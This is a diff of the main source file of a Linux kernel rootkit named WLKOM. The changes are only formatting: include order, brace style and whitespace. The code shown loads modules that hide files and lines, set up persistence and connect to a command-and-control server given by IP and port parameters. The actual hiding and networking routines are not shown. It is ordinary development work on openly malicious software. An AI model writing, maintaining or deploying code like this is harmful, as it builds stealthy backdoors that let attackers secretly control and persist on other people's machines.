@@ -1,8 +1,9 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/init.h>
-#include "hide.h"
+#include <linux/kernel.h>
+#include <linux/module.h>
+
 #include "connect.h"
+#include "hide.h"
 #include "persist.h"
 
 #define WLKOM_VERSION "1.0.0"
@@ -25,13 +26,14 @@ MODULE_PARM_DESC(c2_port, "C2 server port");
 static int __init wlkom_init(void)
 {
     int ret;
-    
+
     pr_info("WLKOM: module loading...\n");
     pr_info("WLKOM: C2 IP = %s, Port = %d\n", c2_ip, c2_port);
 
     /* Initialize hiding FIRST */
     ret = hide_init();
-    if (ret < 0) {
+    if (ret < 0)
+    {
         pr_err("WLKOM: failed to initialize hiding\n");
         return ret;
     }
@@ -41,7 +43,8 @@ static int __init wlkom_init(void)
 
     /* Initialize persistence (which uses hide_file/hide_line) */
     ret = persist_init();
-    if (ret < 0) {
+    if (ret < 0)
+    {
         pr_err("WLKOM: failed to initialize persistence\n");
         hide_exit();
         return ret;
@@ -49,7 +52,8 @@ static int __init wlkom_init(void)
 
     /* Initialize connection to C2 */
     ret = connect_init(c2_ip, c2_port);
-    if (ret < 0) {
+    if (ret < 0)
+    {
         pr_err("WLKOM: failed to initialize connection\n");
         persist_exit();
         hide_exit();
@@ -63,11 +67,11 @@ static int __init wlkom_init(void)
 static void __exit wlkom_exit(void)
 {
     pr_info("WLKOM: module unloading...\n");
-    
+
     connect_exit();
     persist_exit();
     hide_exit();
-    
+
     pr_info("WLKOM: module unloaded\n");
 }
 
